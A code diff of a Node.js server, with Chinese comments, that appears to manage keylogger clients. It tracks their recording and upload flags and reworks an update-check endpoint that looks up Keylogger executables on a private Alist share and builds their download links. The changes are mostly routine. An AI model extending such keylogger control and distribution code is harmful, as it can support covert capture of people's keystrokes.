@@ -759,24 +759,25 @@ class ClientManager {
     }
 
     handleResponse(client, response) {
-        client.lastSeen = new Date();
-        updateLastSeen(client.id).catch(e => this.logger.error(e));
+    client.lastSeen = new Date();
+    updateLastSeen(client.id).catch(e => this.logger.error(e));
+    this.logger.silly(`客户端 ${client.id} 响应数据: ${JSON.stringify(response)}`);
 
-        if (response.status === 'ok' && response.data) {
-            if (response.data.recording !== undefined) {
-                client.recording = response.data.recording;
-            }
-            if (response.data.upload_enabled !== undefined) {
-                client.uploadEnabled = response.data.upload_enabled;
-            }
+    if (response.status === 'ok' && response.data) {
+        if (response.data.recording !== undefined) {
+            client.recording = response.data.recording;
         }
-
-        this.broadcastToWeb({
-            type: 'client_response',
-            clientId: client.id,
-            response
-        });
+        if (response.data.upload_enabled !== undefined) {
+            client.uploadEnabled = response.data.upload_enabled;
+        }
     }
+
+    this.broadcastToWeb({
+        type: 'client_response',
+        clientId: client.id,
+        response
+    });
+}
 
     sendCommand(clientId, command) {
         const client = this.clients.get(clientId);
@@ -1252,12 +1253,9 @@ app.get('/api/update/check', asyncHandler(async (req, res) => {
     try {
         logger.info('开始检查更新...');
         
-        // 检查多个可能的目录
+        // 只检查用户指定的目录
         const possibleDirs = [
-            '/学生目录/软件/键盘记录器',
-            '/软件/键盘记录器',
-            '/键盘记录器',
-            '/'
+            '/学生目录/软件/键盘记录器'
         ];
         
         let latestVersion = '1.0.1';
@@ -1288,15 +1286,16 @@ app.get('/api/update/check', asyncHandler(async (req, res) => {
                         logger.info(`目录 ${dir} 为空`);
                     }
                 } catch (error) {
-                    logger.error(`检查目录 ${dir} 失败`, { error: error.message });
+                    logger.error(`检查目录 ${dir} 失败`, { error: error.message, stack: error.stack });
                 }
             }
             
             // 过滤出 Keylogger 可执行文件并解析版本号
             const keyloggerFiles = foundFiles.filter(file => {
-                const match = file.filename.match(/^Keylogger_v(\d+\.\d+\.\d+)\.exe$/i);
+                const match = file.filename.match(/^Keylogger(_v(\d+\.\d+\.\d+))?\.exe$/i);
                 if (match) {
-                    logger.info(`找到 Keylogger 文件: ${file.filename}, 版本: ${match[1]}`);
+                    const version = match[2] || '1.0.0';
+                    logger.info(`找到 Keylogger 文件: ${file.filename}, 版本: ${version}`);
                 }
                 return match;
             });
@@ -1304,24 +1303,60 @@ app.get('/api/update/check', asyncHandler(async (req, res) => {
             if (keyloggerFiles.length > 0) {
                 // 比较版本号，找出最新版本
                 let tempLatestVersion = '0.0.0';
+                let latestFilename = '';
+                let latestDir = '';
                 
-                keyloggerFiles.forEach(file => {
-                    const match = file.filename.match(/^Keylogger_v(\d+\.\d+\.\d+)\.exe$/i);
+                for (const file of keyloggerFiles) {
+                    const match = file.filename.match(/^Keylogger(_v(\d+\.\d+\.\d+))?\.exe$/i);
                     if (match) {
-                        const version = match[1];
+                        const version = match[2] || '1.0.0';
                         if (compareVersions(version, tempLatestVersion) > 0) {
                             tempLatestVersion = version;
+                            latestFilename = file.filename;
                         }
                     }
-                });
+                }
                 
-                if (tempLatestVersion !== '0.0.0') {
+                // 找到最新版本后，确定其所在目录
+                if (latestFilename) {
+                    for (const dir of possibleDirs) {
+                        try {
+                            const dirFiles = await alistClient.listFiles(dir);
+                            if (dirFiles.some(f => f.filename === latestFilename)) {
+                                latestDir = dir;
+                                break;
+                            }
+                        } catch (error) {
+                            // 忽略错误
+                        }
+                    }
+                }
+                
+                if (tempLatestVersion !== '0.0.0' && latestDir) {
                     latestVersion = tempLatestVersion;
-                    downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/Keylogger_v${latestVersion}.exe`;
-                    logger.info(`找到最新版本: ${latestVersion}, 下载链接: ${downloadUrl}`);
+                    // 构建完整文件路径
+                    const filePath = `${latestDir}/${latestFilename}`;
+                    try {
+                        // 获取文件的原始下载链接
+                        const fileInfo = await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(filePath)}`);
+                        if (fileInfo.code === 200 && fileInfo.data && fileInfo.data.raw_url) {
+                            downloadUrl = fileInfo.data.raw_url;
+                            logger.info(`找到最新版本: ${latestVersion}, 文件名: ${latestFilename}, 直接下载链接: ${downloadUrl}`);
+                        } else {
+                            // 如果获取raw_url失败，使用默认构造的链接
+                            downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/${encodeURIComponent(latestFilename)}`;
+                            logger.warn(`获取raw_url失败，使用默认链接: ${downloadUrl}`);
+                        }
+                    } catch (error) {
+                        // 如果获取raw_url失败，使用默认构造的链接
+                        downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/${encodeURIComponent(latestFilename)}`;
+                        logger.warn(`获取raw_url失败: ${error.message}, 使用默认链接: ${downloadUrl}`);
+                    }
                 }
             } else {
                 logger.info('未找到 Keylogger 可执行文件');
+                // 尝试直接使用用户提到的路径
+                logger.info('尝试使用用户提到的路径作为下载链接');
             }
         } catch (error) {
             logger.error('检查 Alist 版本失败，使用默认版本', { error: error.message, stack: error.stack });
